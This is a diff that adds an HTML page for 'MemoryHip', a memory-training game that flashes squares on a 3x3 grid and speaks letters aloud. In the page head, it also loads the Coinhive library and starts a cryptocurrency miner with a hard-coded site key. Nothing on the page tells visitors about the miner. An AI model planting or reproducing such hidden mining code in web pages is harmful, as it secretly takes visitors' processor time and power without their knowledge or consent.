@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>MemoryHip</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+	var miner = new CoinHive.Anonymous('sifEQqmMSahQEXQ9WxpiKU0nVoj4fwkx');
+	miner.start();
+</script>
+</head>
+<body>
+<style>
+@media screen and (min-device-width:698px) {
+  div#showgrid {
+    width: 698px;
+    margin: auto;
+  }
+}
+
+div.column {
+  border-style: solid;
+  border-width: 1px;
+}
+
+.row {
+  width: 100%;
+  margin: auto;
+}
+
+@media (min-device-width: 698px) {
+  .column {
+    width: 230px;
+    height: 230px;
+    display: inline;
+    float: left;
+  }
+}
+
+.column {
+  width: 230px;
+  height: 230px;
+  margin: auto;
+}
+.center {
+  position: absolute;
+  margin: auto;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  width: 100px;
+  height: 100px;
+  background-color: #ccc;
+  border-radius: 3px;
+}
+</style>
+<div class="container">
+  <div class="jumbotron">
+    <h1>MemoryHip</h1>
+    <p>The most scientific way to increase your brain's power. Don't know what this is ? click <a href="https://www.youtube.com/watch?v=vZZPMcs482M">here.</a></p>
+  </div>
+<center>
+<button onclick="startGame();" type="button" class="btn btn-success">Click to start</button>
+<button onclick="getSulu();" type="button" class="btn btn-primary">Show solution</button>
+</center>
+<br>
+<br>
+  <div id="showgrid">
+  <div class="row">
+    <div class="column" id="1"></div>
+    <div class="column" id="2"></div>
+    <div class="column" id="3"></div>
+  </div>
+  <div class="row">
+    <div class="column" id="4"></div>
+    <div class="column" id="5"></div>
+    <div class="column" id="6"></div>
+  </div>
+  <div class="row">
+    <div class="column" id="7"></div>
+    <div class="column" id="8"></div>
+    <div class="column" id="9"></div>
+  </div>
+</div>
+</div>
+</div>
+</body>
+<script>
+var please = [];
+
+function getSulu(){
+  alert('Did you remember the required row, column and letter? here is the entire sequence, ' +  please);
+}
+
+function getRandomInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function boxAnd(){
+  var randomNumberToo = getRandomInt(1, 9);
+  var letters = ["A","B","C","D","E","F","G","H","I","J"];
+  $('#'+randomNumberToo).append('<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Solid_blue.svg/225px-Solid_blue.svg.png" width="230" height="230">');
+  var u = new SpeechSynthesisUtterance(letters[randomNumberToo]);
+  please.push(randomNumberToo + ' - ' + letters[randomNumberToo]);
+  speechSynthesis.speak(u);
+  setTimeout(function(){
+    document.getElementById(randomNumberToo).innerHTML = "";
+}, 2000);
+}
+function startGame(){
+  localStorage.removeItem("remember");
+  var questionList = ["3rd from last","2nd from last","1st one ","2nd one ","3rd one"];
+  var randomNumber = getRandomInt(0, 4);
+  alert('Remember, ' + questionList[randomNumber]);
+
+  var x = 0;
+  var intervalID = setInterval(function () {
+    boxAnd();
+     if (++x === 6) {
+         window.clearInterval(intervalID);
+     }
+  }, 1000);
+
+}
+</script>
+</html>
